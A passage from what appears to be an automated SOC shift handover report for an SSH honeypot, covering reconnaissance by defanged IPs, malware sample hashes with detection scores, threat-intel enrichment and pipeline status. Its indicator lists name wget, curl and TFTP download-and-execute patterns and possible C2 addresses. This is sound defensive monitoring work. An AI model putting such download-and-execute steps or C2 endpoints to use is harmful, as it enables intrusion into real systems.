| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `echo OK` |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:55:06` | `cowrie.session.params` |
| `2026-07-05 06:55:06` | `cowrie.command.input` |
| `2026-07-05 06:55:09` | `cowrie.log.closed` |
| `2026-07-05 06:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `45.198.224[.]120`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.81.2[.]201` | **124** | 2026-07-05 06:56 | 2026-07-05 08:55 | 75m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **92** | 2026-07-05 07:00 | 2026-07-05 08:54 | 66m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **59** | 2026-07-05 06:55 | 2026-07-05 08:54 | 60m | 0 | `T1592` | 🟠 MEDIUM |
| `111.19.212[.]140` | **6** | 2026-07-05 07:01 | 2026-07-05 07:14 | 9m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]11` | **3** | 2026-07-05 08:34 | 2026-07-05 08:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **3** | 2026-07-05 08:01 | 2026-07-05 08:30 | 3m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | **2** | 2026-07-05 07:06 | 2026-07-05 07:52 | 1m | 0 | `T1592` | 🟢 LOW |
| `115.191.22[.]111` | **2** | 2026-07-05 07:06 | 2026-07-05 07:18 | 4m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-05 07:17 | 2026-07-05 08:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.173.85[.]94` | 1 | 2026-07-05 08:24 | 2026-07-05 08:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.62.203[.]160` | 1 | 2026-07-05 08:11 | 2026-07-05 08:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.84[.]96` | 1 | 2026-07-05 08:07 | 2026-07-05 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.56.46[.]78` | 1 | 2026-07-05 07:09 | 2026-07-05 07:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-05 08:33 | 2026-07-05 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-05 07:35 | 2026-07-05 07:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-05 07:07 | 2026-07-05 07:09 | 85s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-07-05 07:02 | 2026-07-05 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-05 07:24 | 2026-07-05 07:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-07-05 08:54 | 2026-07-05 08:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]6` | 1 | 2026-07-05 08:51 | 2026-07-05 08:51 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `165.22.1[.]254` | US | DigitalOcean, LLC | **100** ⚠️ | 32 |
| `58.56.200[.]238` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 16 |
| `45.79.5[.]11` | US | Linode | **100** ⚠️ | 50 |
| `45.79.207[.]252` | US | Linode | **100** ⚠️ | 50 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `91.92.40[.]6` | NL | TechTies Inc. | **100** ⚠️ | 44 |
| `159.65.84[.]96` | GB | DigitalOcean, LLC | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 113 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 99 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 1 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 413 cases |
| Tool 34  | Credential Extractor        | ✅ 112 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 100 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 293 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-05T10:20:09Z_
